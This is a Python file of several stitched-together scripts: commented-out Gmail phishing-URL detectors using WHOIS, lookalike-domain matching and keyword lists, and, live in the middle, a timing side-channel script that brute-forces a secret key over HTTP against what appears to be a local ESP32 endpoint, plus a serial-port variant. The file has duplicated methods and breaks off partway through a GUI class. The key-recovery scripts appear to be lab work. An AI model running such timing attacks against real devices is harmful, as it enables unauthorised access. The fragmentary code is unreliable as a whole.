# import base64
# import re
# import whois
# import tldextract
# from datetime import datetime
# from fuzzywuzzy import fuzz
# from google.oauth2.credentials import Credentials
# from google_auth_oauthlib.flow import InstalledAppFlow
# from googleapiclient.discovery import build
#
# # Gmail API access scope
# SCOPES = ['https://www.googleapis.com/auth/gmail.readonly']
#
# # Authenticate Gmail API
# def authenticate_gmail():
#     flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
#     creds = flow.run_local_server(port=0)
#     return build('gmail', 'v1', credentials=creds)
#
# # Extract URLs from email, supporting nested MIME parts
# def extract_urls_from_email(msg):
#     def get_parts(parts):
#         for part in parts:
#             if part.get('parts'):
#                 yield from get_parts(part['parts'])
#             elif part.get('mimeType') in ['text/plain', 'text/html'] and 'data' in part.get('body', {}):
#                 try:
#                     data = base64.urlsafe_b64decode(part['body']['data']).decode('utf-8')
#                     yield data
#                 except Exception:
#                     continue
#
#     body_texts = []
#     if 'parts' in msg['payload']:
#         body_texts = list(get_parts(msg['payload']['parts']))
#     elif 'body' in msg['payload'] and 'data' in msg['payload']['body']:
#         try:
#             body_texts = [base64.urlsafe_b64decode(msg['payload']['body']['data']).decode('utf-8')]
#         except Exception:
#             body_texts = []
#
#     urls = []
#     for text in body_texts:
#         print(f"\n📨 Email Body Snippet:\n{text[:300]}")  # Optional debug print
#         urls += re.findall(r'https?://[^\s)<>"\']+', text)
#
#     return urls
#
# # Get domain WHOIS information with error handling
# def get_domain_info(domain):
#     try:
#         w = whois.whois(domain)
#
#         # Fail if WHOIS returns nothing
#         if not w or not w.domain_name:
#             raise ValueError("WHOIS data is empty or malformed")
#
#         creation_date = w.creation_date
#         if isinstance(creation_date, list):
#             creation_date = creation_date[0]
#
#         age_days = (datetime.now() - creation_date).days if creation_date else "Unknown"
#
#         return {
#             "domain": domain,
#             "created": creation_date,
#             "age_days": age_days,
#             "org": w.org,
#             "registrar": w.registrar
#         }
#
#     except Exception as e:
#         return {
#             "domain": domain,
#             "created": None,
#             "age_days": None,
#             "org": None,
#             "registrar": None,
#             "error": str(e)
#         }
#
# # Check if a domain resembles a trusted domain
# def is_lookalike(domain, trusted_domains, threshold=80):
#     if len(domain) < 6:
#         return False, None, 0  # Ignore very short domains to avoid false positives
#     for trusted in trusted_domains:
#         score = fuzz.partial_ratio(domain.lower(), trusted.lower())
#         if score >= threshold:
#             return True, trusted, score
#     return False, None, 0
#
# # Main function
# def main():
#     service = authenticate_gmail()
#
#     # List of trusted domains
#     trusted_domains = [
#         "google.com", "meity.gov.in", "uidai.gov.in", "rbi.org.in", "gov.in",
#         "microsoft.com", "irctc.co.in", "digitalindia.gov.in", "nic.in", "cbse.gov.in"
#     ]
#
#     # Fetch recent messages
#     results = service.users().messages().list(userId='me', maxResults=5).execute()
#     messages = results.get('messages', [])
#
#     for msg in messages:
#         msg_data = service.users().messages().get(userId='me', id=msg['id']).execute()
#         urls = extract_urls_from_email(msg_data)
#
#         print(f"\n🔍 Email ID: {msg['id']}")
#         print(f"🔗 Extracted URLs: {urls}")
#
#         for url in urls:
#             ext = tldextract.extract(url)
#             domain = f"{ext.domain}.{ext.suffix}"
#
#             info = get_domain_info(domain)
#
#             print(f"\n➡️ Domain: {domain}")
#             print(f"📅 Created: {info.get('created')}")
#             print(f"📆 Age (days): {info.get('age_days')}")
#             print(f"🏢 Org: {info.get('org')}")
#             print(f"📝 Registrar: {info.get('registrar')}")
#
#             if 'error' in info:
#                 print(f"❌ WHOIS Lookup Failed: {info['error']}")
#
#             is_fake, similar_to, score = is_lookalike(domain, trusted_domains)
#             if is_fake:
#                 print(f"⚠️ Domain looks similar to official: {similar_to} (Similarity: {score}%)")
#             else:
#                 print("✅ Domain appears unique (not a known lookalike).")
#
# if __name__ == '__main__':
#     main()
import serial
import time
import string

# SERIAL_PORT = 'COM5'  # Set your port
# BAUD_RATE = 115200
# PASSWORD_LENGTH = 6
# ATTEMPTS_PER_CHAR = 5  # Try each guess 5 times
#
# charset = string.ascii_uppercase  # Characters A-Z
# ser = serial.Serial(SERIAL_PORT, BAUD_RATE, timeout=1)
# time.sleep(2)  # Wait for ESP32
#
# recovered = ""
#
# print("⏱️ Starting timing attack...\n")
#
# for pos in range(PASSWORD_LENGTH):
#     best_char = ''
#     best_time = 0
#
#     for ch in charset:
#         attempt = recovered + ch + "A" * (PASSWORD_LENGTH - len(recovered) - 1)
#         total_time = 0
#
#         for _ in range(ATTEMPTS_PER_CHAR):
#             ser.reset_input_buffer()
#             start = time.perf_counter()
#             ser.write(attempt.encode())
#             ser.read()  # read response (0 or 1)
#             end = time.perf_counter()
#             total_time += (end - start)
#
#         avg_time = total_time / ATTEMPTS_PER_CHAR
#
#         if avg_time > best_time:
#             best_time = avg_time
#             best_char = ch
#
#     recovered += best_char
#     print(f"✅ Best guess so far: {recovered}")
#
# print(f"\n🎯 Recovered password: {recovered}")
import requests
import time
import string
import statistics

# Configuration
TARGET_URL = "http://192.168.4.1/update"
SECRET_LENGTH = 8
CHARSET = string.ascii_uppercase + string.digits
TIMEOUT = 1  # seconds
REPEATS = 20
MIN_VALID_RESPONSES = 10
CONFIDENCE_THRESHOLD = 20000  # µs = 20ms
MAX_RETRIES_FOR_LOW_RESPONSES = 3
AUTO_COOL_DELAY = 6  # seconds of delay after repeated low-response retries


def measure_time_filtered(guess, repeats=REPEATS):
    times = []
    attempts = 0

    while attempts < MAX_RETRIES_FOR_LOW_RESPONSES:
        for _ in range(repeats):
            try:
                start = time.perf_counter()
                response = requests.get(TARGET_URL, params={"key": guess}, timeout=TIMEOUT)
                elapsed = (time.perf_counter() - start) * 1_000_000
                times.append(elapsed)
            except requests.exceptions.RequestException:
                continue
            time.sleep(0.4)  # slightly slower to reduce hammering

        if len(times) >= MIN_VALID_RESPONSES:
            break

        attempts += 1
        print(f"🔁 Retrying '{guess}' due to low responses ({len(times)} collected so far)")

        if attempts >= 2:
            print(f"🌡 Too many retries — cooling down for {AUTO_COOL_DELAY} seconds...")
            time.sleep(AUTO_COOL_DELAY)

    if len(times) == 0:
        print(f"❌ All requests failed for '{guess}' — skipping completely.")
        return 0

    avg = statistics.mean(times)
    std = statistics.stdev(times) if len(times) > 1 else 0
    filtered = [t for t in times if abs(t - avg) <= std] or times

    return statistics.median(filtered)


def attack():
    key_guess = ""
    for pos in range(SECRET_LENGTH):
        print(f"\n🔍 Brute-forcing position {pos + 1}...")
        timings = {}

        for char in CHARSET:
            guess = key_guess + char + "A" * (SECRET_LENGTH - len(key_guess) - 1)
            avg_time = measure_time_filtered(guess)
            timings[char] = avg_time
            print(f"🔎 Tried {guess} → ⏱ {avg_time:.1f} µs")

        sorted_timings = sorted(timings.items(), key=lambda x: x[1], reverse=True)

        print("\n📊 Initial top 3 guesses:")
        for i in range(min(3, len(sorted_timings))):
            ch, t = sorted_timings[i]
            print(f" {i + 1}. {ch} → {t:.1f} µs")

        print("\n🔁 Rechecking top 3 guesses with double repeats...")
        refined = {}
        for char, _ in sorted_timings[:3]:
            guess = key_guess + char + "A" * (SECRET_LENGTH - len(key_guess) - 1)
            avg_time = measure_time_filtered(guess, repeats=REPEATS * 2)
            refined[char] = avg_time
            print(f"🔁 Recheck {guess} → ⏱ {avg_time:.1f} µs")

        best_char = max(refined, key=refined.get)
        key_guess += best_char

        print(f"\n✅ Position {pos + 1} guessed: {best_char}")
        print(f"[+] Current key guess: {key_guess}")
        print("-" * 40)

    print(f"\n🎉 Attack complete! Final key: {key_guess}")


if __name__ == "__main__":
    attack()
#
import base64
import re
import whois
import tldextract
import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox
from datetime import datetime
from fuzzywuzzy import fuzz
from google.oauth2.credentials import Credentials
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build
import os
import pickle
import threading
import requests
from urllib.parse import urlparse
import ssl
import socket
import time

# import tkinter as tk
# from tkinter import ttk, scrolledtext, messagebox, simpledialog
# import threading
# import pickle
# import os.path
# import base64
# import re
# import socket
# import ssl
# from datetime import datetime
# from urllib.parse import urlparse
# import json
# import tldextract
# from fuzzywuzzy import fuzz
# import whois
# from google.auth.transport.requests import Request
# from google.oauth2.credentials import Credentials
# from google_auth_oauthlib.flow import InstalledAppFlow
# from googleapiclient.discovery import build
#
# # Gmail API scope
# SCOPES = ['https://www.googleapis.com/auth/gmail.readonly']
#
#
# class AdvancedPhishingDetector:
#     def __init__(self, root):
#         self.root = root
#         self.root.title("🛡️ Advanced Phishing Detector")
#         self.root.geometry("1400x900")
#         self.root.configure(bg='#1e1e1e')
#
#         # Configuration settings with defaults
#         self.settings = {
#             'scan_limit': 10,
#             'risk_threshold': 40,
#             'similarity_threshold': 75,
#             'enable_ssl_check': True,
#             'enable_similarity_check': True,
#             'enable_subject_analysis': True,
#             'highlight_suspicious': True
#         }
#
#         # Modern color scheme
#         self.colors = {
#             'bg': '#1e1e1e',
#             'card_bg': '#2d2d30',
#             'accent': '#007acc',
#             'success': '#4CAF50',
#             'warning': '#FF9800',
#             'danger': '#F44336',
#             'text_primary': '#ffffff',
#             'text_secondary': '#cccccc',
#             'highlight_safe': '#2E7D32',
#             'highlight_low': '#689F38',
#             'highlight_medium': '#F57C00',
#             'highlight_high': '#D32F2F'
#         }
#
#         # Style configuration
#         self.setup_styles()
#
#         # Enhanced trusted domains with categories
#         self.trusted_domains = self.load_trusted_domains()
#
#         # Suspicious keywords
#         self.suspicious_keywords = [
#             'verify', 'security', 'login', 'password', 'banking', 'urgent',
#             'account', 'suspended', 'confirm', 'update', 'immediately',
#             'limited time', 'action required', 'unauthorized', 'breach'
#         ]
#
#         self.setup_gui()
#         self.scanning = False
#         self.stop_scan = False
#
#     def setup_styles(self):
#         """Configure modern dark theme styles"""
#         style = ttk.Style()
#         style.theme_use('clam')
#
#         # Configure colors for dark theme
#         style.configure('TFrame', background=self.colors['bg'])
#         style.configure('TLabel',
#                         background=self.colors['bg'],
#                         foreground=self.colors['text_primary'],
#                         font=('Segoe UI', 10))
#
#         style.configure('Title.TLabel',
#                         font=('Segoe UI', 20, 'bold'),
#                         background=self.colors['bg'],
#                         foreground=self.colors['accent'])
#
#         style.configure('Subtitle.TLabel',
#                         font=('Segoe UI', 12),
#                         background=self.colors['bg'],
#                         foreground=self.colors['text_secondary'])
#
#         style.configure('Card.TFrame',
#                         background=self.colors['card_bg'],
#                         relief='raised',
#                         borderwidth=1)
#
#         style.configure('Accent.TButton',
#                         font=('Segoe UI', 11, 'bold'),
#                         padding=(25, 12),
#                         background=self.colors['accent'],
#                         foreground='white')
#
#         style.configure('Secondary.TButton',
#                         font=('Segoe UI', 10),
#                         padding=(20, 10),
#                         background=self.colors['card_bg'],
#                         foreground=self.colors['text_primary'])
#
#         style.configure('Danger.TButton',
#                         font=('Segoe UI', 10, 'bold'),
#                         padding=(20, 10),
#                         background=self.colors['danger'],
#                         foreground='white')
#
#         style.configure('Success.TButton',
#                         font=('Segoe UI', 10, 'bold'),
#                         padding=(20, 10),
#                         background=self.colors['success'],
#                         foreground='white')
#
#         style.configure('Custom.Vertical.TProgressbar',
#                         background=self.colors['accent'],
#                         troughcolor=self.colors['card_bg'])
#
#         style.configure('TLabelframe',
#                         background=self.colors['bg'],
#                         foreground=self.colors['text_primary'])
#
#         style.configure('TLabelframe.Label',
#                         background=self.colors['bg'],
#                         foreground=self.colors['accent'],
#                         font=('Segoe UI', 11, 'bold'))
#
#     def load_trusted_domains(self):
#         """Load comprehensive trusted domains"""
#         default_domains = {
#             'google.com', 'gmail.com', 'youtube.com', 'microsoft.com',
#             'amazon.in', 'gov.in', 'sbi.co.in', 'paytm.com', 'flipkart.com'
#         }
#
#         file_path = "trusted_domains.json"
#
#         if os.path.exists(file_path):
#             try:
#                 with open(file_path, 'r') as f:
#                     domains = set(json.load(f))
#                     return domains
#             except Exception as e:
#                 print(f"[!] Error reading {file_path}: {e}")
#                 return default_domains
#         else:
#             print("[!] trusted_domains.json not found — using default list.")
#             return default_domains
#
#     def is_trusted_domain(self, domain):
#         """Enhanced trusted domain check"""
#         if domain in self.trusted_domains:
#             return True
#
#         # Subdomain check
#         for trusted_domain in self.trusted_domains:
#             if domain.endswith('.' + trusted_domain):
#                 return True
#
#         return False
#
#     def get_domain_info(self, domain):
#         """Enhanced domain information with SSL check"""
#         try:
#             w = whois.whois(domain)
#             creation_date = w.creation_date
#
#             if isinstance(creation_date, list):
#                 creation_date = creation_date[0]
#
#             age_days = (datetime.now() - creation_date).days if creation_date else "Unknown"
#
#             # SSL certificate check
#             ssl_info = self.check_ssl_certificate(domain)
#
#             return {
#                 "domain": domain,
#                 "age_days": age_days,
#                 "org": w.org or "Unknown",
#                 "registrar": w.registrar or "Unknown",
#                 "country": w.country or "Unknown",
#                 "created": creation_date,
#                 "ssl_valid": ssl_info.get('valid', False),
#                 "ssl_days_left": ssl_info.get('days_left', 0)
#             }
#         except Exception as e:
#             return {
#                 "domain": domain,
#                 "age_days": "Unknown",
#                 "org": "Unknown",
#                 "registrar": "Unknown",
#                 "country": "Unknown",
#                 "created": None,
#                 "ssl_valid": False,
#                 "ssl_days_left": 0
#             }
#
#     def check_ssl_certificate(self, domain):
#         """Check SSL certificate validity"""
#         try:
#             context = ssl.create_default_context()
#             with socket.create_connection((domain, 443), timeout=10) as sock:
#                 with context.wrap_socket(sock, server_hostname=domain) as ssock:
#                     cert = ssock.getpeercert()
#
#             # Parse certificate expiration
#             expire_date = datetime.strptime(cert['notAfter'], '%b %d %H:%M:%S %Y %Z')
#             days_left = (expire_date - datetime.now()).days
#
#             return {
#                 'valid': days_left > 0,
#                 'days_left': days_left,
#                 'issuer': dict(x[0] for x in cert['issuer'])['organizationName']
#             }
#         except:
#             return {'valid': False, 'days_left': 0, 'issuer': 'Unknown'}
#
#     def check_domain_similarity(self, domain):
#         """Enhanced domain similarity check with better matching"""
#         if self.is_trusted_domain(domain):
#             return False, None, 0
#
#         best_score = 0
#         best_match = None
#
#         for trusted in self.trusted_domains:
#             # Skip if trusted domain is too short for meaningful comparison
#             if len(trusted) < 4:
#                 continue
#
#             # Clean domains for comparison
#             domain_clean = domain.lower().replace('-', '').replace('.', '')
#             trusted_clean = trusted.lower().replace('-', '').replace('.', '')
#
#             # Skip if domains are identical after cleaning
#             if domain_clean == trusted_clean:
#                 continue
#
#             # Multiple similarity checks with weights
#             ratio_score = fuzz.ratio(domain.lower(), trusted.lower())
#             partial_score = fuzz.partial_ratio(domain.lower(), trusted.lower())
#             token_score = fuzz.token_sort_ratio(domain.lower(), trusted.lower())
#
#             # Use the most appropriate score - token sort ratio is often best for domains
#             combined_score = token_score
#
#             # Penalize scores for very different length domains
#             length_ratio = min(len(domain), len(trusted)) / max(len(domain), len(trusted))
#             if length_ratio < 0.7:  # If lengths differ by more than 30%
#                 combined_score = combined_score * 0.8
#
#             # Bonus for common typosquatting patterns
#             if self.check_typosquatting_specific(domain, trusted):
#                 combined_score = min(combined_score * 1.2, 100)
#
#             # Check for substring relationships
#             if trusted.lower() in domain.lower() or domain.lower() in trusted.lower():
#                 # If one is substring of another, it's highly suspicious
#                 combined_score = max(combined_score, 85)
#
#             if combined_score > best_score:
#                 best_score = combined_score
#                 best_match = trusted
#
#         # Additional checks for common phishing patterns
#         if self.check_common_phishing_patterns(domain):
#             best_score = max(best_score, 80)
#
#         threshold = self.settings.get('similarity_threshold', 75)
#         return best_score > threshold, best_match, round(best_score, 1)
#
#     def check_typosquatting_specific(self, domain, trusted_domain):
#         """Check for specific typosquatting patterns against a trusted domain"""
#         # Remove common TLDs and subdomains for core comparison
#         domain_core = domain.split('.')[0] if '.' in domain else domain
#         trusted_core = trusted_domain.split('.')[0] if '.' in trusted_domain else trusted_domain
#
#         # If cores are identical, it's definitely suspicious
#         if domain_core == trusted_core:
#             return True
#
#         # Common character substitutions with weights
#         substitutions = {
#             'o': ['0'],
#             'i': ['1', 'l'],
#             'l': ['1', 'i'],
#             'm': ['rn', 'nn'],
#             'w': ['vv'],
#             's': ['5'],
#             'a': ['4'],
#             'e': ['3'],
#             't': ['7']
#         }
#
#         # Check single character substitutions
#         if len(domain_core) == len(trusted_core):
#             differences = 0
#             for dc, tc in zip(domain_core, trusted_core):
#                 if dc != tc:
#                     if (tc in substitutions and dc in substitutions[tc]) or (
#                             dc in substitutions and tc in substitutions[dc]):
#                         differences += 1
#                     else:
#                         break
#             if differences == 1:  # Only one character substitution
#                 return True
#
#         # Check for hyphen insertion/removal in core
#         if domain_core.replace('-', '') == trusted_core.replace('-', ''):
#             return True
#
#         # Check for added/removed characters (length difference of 1)
#         if abs(len(domain_core) - len(trusted_core)) == 1:
#             if domain_core in trusted_core or trusted_core in domain_core:
#                 return True
#
#         return False
#
#     def check_typosquatting_specific(self, domain, trusted_domain):
#         """Check for specific typosquatting patterns against a trusted domain"""
#         # Common character substitutions
#         substitutions = {
#             'o': ['0'],
#             'i': ['1', 'l'],
#             'l': ['1', 'i'],
#             'm': ['rn', 'nn'],
#             'w': ['vv'],
#             's': ['5'],
#             'a': ['4'],
#             'e': ['3']
#         }
#
#         # Check if domain is trusted domain with character substitutions
#         if len(domain) == len(trusted_domain):
#             differences = 0
#             for dc, tc in zip(domain, trusted_domain):
#                 if dc != tc:
#                     if (tc in substitutions and dc in substitutions[tc]) or (
#                             dc in substitutions and tc in substitutions[dc]):
#                         differences += 1
#                     else:
#                         break
#             if differences == 1:  # Only one character substitution
#                 return True
#
#         # Check for hyphen insertion/removal
#         if domain.replace('-', '') == trusted_domain.replace('-', ''):
#             return True
#
#         return False
#
#     def check_common_phishing_patterns(self, domain):
#         """Check for common phishing domain patterns with improved logic"""
#         domain_lower = domain.lower()
#
#         # List of obviously legitimate domains that should not be flagged
#         legitimate_domains = ['customerio', 'custom', 'mail', 'email', 'newsletter',
#                               'notification', 'service', 'api', 'cdn', 'assets']
#
#         # Check if domain contains legitimate business terms
#         for legit_term in legitimate_domains:
#             if legit_term in domain_lower:
#                 # If it's a clear business domain, don't flag as phishing pattern
#                 return False
#
#         patterns = [
#             r'secure-.*-login',
#             r'verify-.*-account',
#             r'update-.*-security',
#             r'.*bank.*login.*',
#             r'.*secure.*verify.*',
#             r'login-.*-portal',
#             r'account-.*-confirm',
#             r'password-.*-reset',
#             r'security-.*-update'
#         ]
#
#         for pattern in patterns:
#             if re.match(pattern, domain_lower):
#                 return True
#
#         # Check for domains that combine multiple trusted brand names
#         trusted_terms = ['google', 'facebook', 'apple', 'amazon', 'microsoft', 'paypal',
#                          'netflix', 'instagram', 'whatsapp', 'twitter']
#
#         found_terms = []
#         for term in trusted_terms:
#             if term in domain_lower:
#                 found_terms.append(term)
#
#         # If domain contains multiple trusted brand names, it's suspicious
#         if len(found_terms) >= 2:
#             return True
#
#         return False
#
#     def check_typosquatting(self, domain):
#         """Check for common typosquatting patterns"""
#         patterns = [
#             r'.*[0-9]+.*',  # Numbers in domain
#             r'.*-.*',  # Hyphens in domain
#             r'.*rn.*',  # m -> rn substitution
#             r'.*vv.*',  # w -> vv substitution
#             r'.*ll.*',  # i -> l substitution
#         ]
#
#         for pattern in patterns:
#             if re.match(pattern, domain):
#                 return True
#         return False
#
#     def analyze_url_structure(self, url):
#         """Analyze URL for suspicious patterns"""
#         suspicious_elements = []
#
#         # Check for IP address instead of domain
#         ip_pattern = r'\d+\.\d+\.\d+\.\d+'
#         if re.search(ip_pattern, url):
#             suspicious_elements.append("Uses IP address instead of domain")
#
#         # Check for excessive subdomains
#         parsed = urlparse(url)
#         subdomains = parsed.netloc.split('.')
#         if len(subdomains) > 3:
#             suspicious_elements.append("Too many subdomains")
#
#         # Check for @ symbol (userinfo in URL)
#         if '@' in url:
#             suspicious_elements.append("Contains @ symbol (possible deception)")
#
#         # Check for hexadecimal encoding
#         if '%' in url.lower():
#             suspicious_elements.append("Contains URL encoding")
#
#         # Check for login/verify keywords in subdomains
#         suspicious_keywords_in_domain = ['login', 'verify', 'secure', 'account', 'banking', 'auth']
#         for keyword in suspicious_keywords_in_domain:
#             if keyword in parsed.netloc.lower():
#                 suspicious_elements.append(f"Contains '{keyword}' in domain (suspicious)")
#
#         return suspicious_elements
#
#     def calculate_risk(self, domain_info, is_similar, similarity_score, url, email_subject=""):
#         """Enhanced risk calculation with improved similarity weighting"""
#         risk_score = 0
#         factors = []
#
#         # Trusted domain - very low risk
#         if self.is_trusted_domain(domain_info["domain"]):
#             if domain_info["ssl_valid"]:
#                 return 5, ["✅ Trusted domain with valid SSL"]
#             else:
#                 return 15, ["⚠️ Trusted domain but SSL issues"]
#
#         # Domain age - older domains are generally safer
#         if domain_info["age_days"] != "Unknown":
#             if domain_info["age_days"] < 30:
#                 risk_score += 35
#                 factors.append(f"🆕 Very new domain ({domain_info['age_days']} days)")
#             elif domain_info["age_days"] < 365:
#                 risk_score += 15
#                 factors.append(f"📅 Relatively new domain ({domain_info['age_days']} days)")
#             elif domain_info["age_days"] > 3650:  # Older than 10 years
#                 risk_score -= 10  # Reduce risk for very old domains
#
#         # Similarity to trusted domains - with more nuanced scoring
#         if is_similar and self.settings.get('enable_similarity_check', True):
#             # Higher similarity = higher risk, but consider domain age
#             base_similarity_risk = min(25 + (similarity_score - self.settings.get('similarity_threshold', 75)), 45)
#
#             # Reduce risk for older domains even if similar
#             if domain_info["age_days"] != "Unknown" and domain_info["age_days"] > 365:
#                 base_similarity_risk = base_similarity_risk * 0.7
#
#             risk_score += base_similarity_risk
#             factors.append(f"🎭 Domain similarity: {similarity_score}% (looks like trusted domains)")
#
#         # SSL certificate - more important for sensitive domains
#         if self.settings.get('enable_ssl_check', True):
#             if not domain_info["ssl_valid"]:
#                 risk_score += 25
#                 factors.append("🔒 No valid SSL certificate")
#             elif domain_info["ssl_days_left"] < 30:
#                 risk_score += 10
#                 factors.append(f"⚠️ SSL certificate expiring in {domain_info['ssl_days_left']} days")
#
#         # Unknown organization - less weight for older domains
#         if domain_info["org"] == "Unknown":
#             org_risk = 20
#             if domain_info["age_days"] != "Unknown" and domain_info["age_days"] > 365:
#                 org_risk = 10  # Reduce risk for older domains with unknown org
#             risk_score += org_risk
#             factors.append("❓ Unknown organization")
#
#         # URL structure analysis
#         url_issues = self.analyze_url_structure(url)
#         if url_issues:
#             risk_score += len(url_issues) * 8  # Reduced from 10
#             factors.extend([f"🔗 {issue}" for issue in url_issues])
#
#         # Email subject analysis
#         if email_subject and self.settings.get('enable_subject_analysis', True):
#             subject_risk = self.analyze_email_subject(email_subject)
#             risk_score += subject_risk
#             if subject_risk > 0:
#                 factors.append("📧 Suspicious email subject detected")
#
#         # Ensure risk score is within bounds
#         risk_score = max(0, min(risk_score, 100))
#
#         return risk_score, factors
#
#     def analyze_email_subject(self, subject):
#         """Analyze email subject for phishing indicators"""
#         risk_score = 0
#         subject_lower = subject.lower()
#
#         # Check for urgency keywords
#         urgency_keywords = ['urgent', 'immediately', 'action required', 'last chance', 'important']
#         for keyword in urgency_keywords:
#             if keyword in subject_lower:
#                 risk_score += 10
#
#         # Check for security keywords
#         security_keywords = ['verify', 'security', 'suspended', 'breach', 'compromised']
#         for keyword in security_keywords:
#             if keyword in subject_lower:
#                 risk_score += 8
#
#         # Check for financial keywords
#         financial_keywords = ['bank', 'payment', 'invoice', 'transaction', 'refund']
#         for keyword in financial_keywords:
#             if keyword in subject_lower:
#                 risk_score += 5
#
#         return min(risk_score, 40)
#
#     def extract_urls(self, msg):
#         """Enhanced URL extraction with email metadata"""
#
#         def get_email_parts(parts):
#             for part in parts:
#                 if part.get('parts'):
#                     yield from get_email_parts(part['parts'])
#                 elif part.get('mimeType') in ['text/plain', 'text/html'] and 'data' in part.get('body', {}):
#                     try:
#                         data = base64.urlsafe_b64decode(part['body']['data']).decode('utf-8')
#                         yield data
#                     except:
#                         continue
#
#         # Get email subject
#         headers = msg.get('payload', {}).get('headers', [])
#         subject = ""
#         for header in headers:
#             if header.get('name', '').lower() == 'subject':
#                 subject = header.get('value', '')
#                 break
#
#         body_texts = []
#         if 'parts' in msg['payload']:
#             body_texts = list(get_email_parts(msg['payload']['parts']))
#         elif 'body' in msg['payload'] and 'data' in msg['payload']['body']:
#             try:
#                 body_texts = [base64.urlsafe_b64decode(msg['payload']['body']['data']).decode('utf-8')]
#             except:
#                 pass
#
#         urls = []
#         for text in body_texts:
#             # Enhanced URL regex
#             found_urls = re.findall(
#                 r'https?://(?:[-\w.]|(?:%[\da-fA-F]{2}))+[/\w\.-]*\??[/\w\.-=&%]*',
#                 text
#             )
#             urls.extend(found_urls)
#
#         return list(set(urls)), subject
#
#     def authenticate_gmail(self):
#         """Gmail authentication with error handling"""
#         creds = None
#         try:
#             if os.path.exists('token.pickle'):
#                 with open('token.pickle', 'rb') as token:
#                     creds = pickle.load(token)
#
#             if not creds or not creds.valid:
#                 if not os.path.exists('credentials.json'):
#                     messagebox.showerror(
#                         "Configuration Required",
#                         "credentials.json file missing!\n\n"
#                         "To set up Gmail API:\n"
#                         "1. Go to https://console.cloud.google.com/\n"
#                         "2. Create a project and enable Gmail API\n"
#                         "3. Create OAuth 2.0 credentials\n"
#                         "4. Download credentials.json and place in this folder"
#                     )
#                     return None
#
#                 flow = InstalledAppFlow.from_client_secrets_file('credentials.json', SCOPES)
#                 creds = flow.run_local_server(port=0)
#
#                 with open('token.pickle', 'wb') as token:
#                     pickle.dump(creds, token)
#
#             return build('gmail', 'v1', credentials=creds)
#
#         except Exception as e:
#             messagebox.showerror("Authentication Error", f"Failed to authenticate: {str(e)}")
#             return None
#
#     def setup_gui(self):
#         """Setup enhanced modern GUI with better visibility"""
#         # Main frame
#         main_frame = ttk.Frame(self.root, padding="20")
#         main_frame.grid(row=0, column=0, sticky=(tk.W, tk.E, tk.N, tk.S))
#         main_frame.configure(style='Card.TFrame')
#
#         # Header with icon and title
#         header_frame = ttk.Frame(main_frame, style='Card.TFrame')
#         header_frame.grid(row=0, column=0, columnspan=2, pady=(0, 20), sticky=(tk.W, tk.E))
#
#         # App icon and title
#         icon_frame = ttk.Frame(header_frame, style='Card.TFrame')
#         icon_frame.grid(row=0, column=0, sticky=tk.W)
#
#         title_label = ttk.Label(icon_frame,
#                                 text="🛡️Advanced Phishing Detector",
#                                 style='Title.TLabel')
#         title_label.grid(row=0, column=0, sticky=tk.W)
#
#         subtitle_label = ttk.Label(icon_frame,
#                                    text="Email Security Scanner | Real-time Phishing Detection",
#                                    style='Subtitle.TLabel')
#         subtitle_label.grid(row=1, column=0, sticky=tk.W, pady=(5, 0))
#
#         # Stats frame
#         stats_frame = ttk.Frame(header_frame, style='Card.TFrame')
#         stats_frame.grid(row=0, column=1, sticky=tk.E)
#
#         self.stats_label = ttk.Label(stats_frame,
#                                      text="🔒 Ready to scan your emails",
#                                      style='Subtitle.TLabel')
#         self.stats_label.grid(row=0, column=0, sticky=tk.E)
#
#         # Controls card
#         controls_card = ttk.LabelFrame(main_frame, text="🛠️ SCAN CONTROLS", padding="15")
#         controls_card.grid(row=1, column=0, columnspan=2, pady=(0, 15), sticky=(tk.W, tk.E))
#         controls_card.configure(style='Card.TFrame')
#
#         # Buttons with modern layout
#         button_frame = ttk.Frame(controls_card, style='Card.TFrame')
#         button_frame.grid(row=0, column=0, sticky=(tk.W, tk.E))
#
#         self.scan_btn = ttk.Button(button_frame,
#                                    text="🚀 Start Email Scan",
#                                    command=self.start_scan,
#                                    style='Accent.TButton')
#         self.scan_btn.grid(row=0, column=0, padx=(0, 10))
#
#         self.stop_btn = ttk.Button(button_frame,
#                                    text="⏹️ Stop Scan",
#                                    command=self.stop_scan_func,
#                                    style='Danger.TButton',
#                                    state='disabled')
#         self.stop_btn.grid(row=0, column=1, padx=(0, 10))
#
#         ttk.Button(button_frame,
#                    text="🔄 Clear Results",
#                    command=self.clear_results,
#                    style='Secondary.TButton').grid(row=0, column=2, padx=(0, 10))
#
#         ttk.Button(button_frame,
#                    text="📊 Statistics",
#                    command=self.show_stats,
#                    style='Secondary.TButton').grid(row=0, column=3, padx=(0, 10))
#
#         ttk.Button(button_frame,
#                    text="⚙️ Settings",
#                    command=self.show_settings,
#                    style='Secondary.TButton').grid(row=0, column=4)
#
#         # Quick actions
#         quick_frame = ttk.Frame(controls_card, style='Card.TFrame')
#         quick_frame.grid(row=1, column=0, sticky=(tk.W, tk.E), pady=(10, 0))
#
#         ttk.Label(quick_frame, text="Quick Actions:", style='Subtitle.TLabel').grid(row=0, column=0, sticky=tk.W)
#
#         ttk.Button(quick_frame,
#                    text="🔍 Check Single URL",
#                    command=self.check_single_url,
#                    style='Secondary.TButton').grid(row=0, column=1, padx=(10, 5))
#
#         ttk.Button(quick_frame,
#                    text="📧 Scan Latest Email",
#                    command=self.scan_latest_email,
#                    style='Secondary.TButton').grid(row=0, column=2, padx=5)
#
#         # Progress section
#         progress_card = ttk.LabelFrame(main_frame, text="📈 SCAN PROGRESS", padding="15")
#         progress_card.grid(row=2, column=0, columnspan=2, pady=(0, 15), sticky=(tk.W, tk.E))
#         progress_card.configure(style='Card.TFrame')
#
#         # Progress bar with percentage
#         self.progress = ttk.Progressbar(progress_card,
#                                         mode='determinate',
#                                         style='Custom.Vertical.TProgressbar')
#         self.progress.grid(row=0, column=0, sticky=(tk.W, tk.E), pady=(0, 10))
#
#         # Status and progress text
#         status_frame = ttk.Frame(progress_card, style='Card.TFrame')
#         status_frame.grid(row=1, column=0, sticky=(tk.W, tk.E))
#
#         self.status_label = ttk.Label(status_frame,
#                                       text="Ready to start scanning...",
#                                       style='Subtitle.TLabel')
#         self.status_label.grid(row=0, column=0, sticky=tk.W)
#
#         self.progress_label = ttk.Label(status_frame,
#                                         text="0%",
#                                         style='Subtitle.TLabel')
#         self.progress_label.grid(row=0, column=1, sticky=tk.E)
#
#         # Results counter
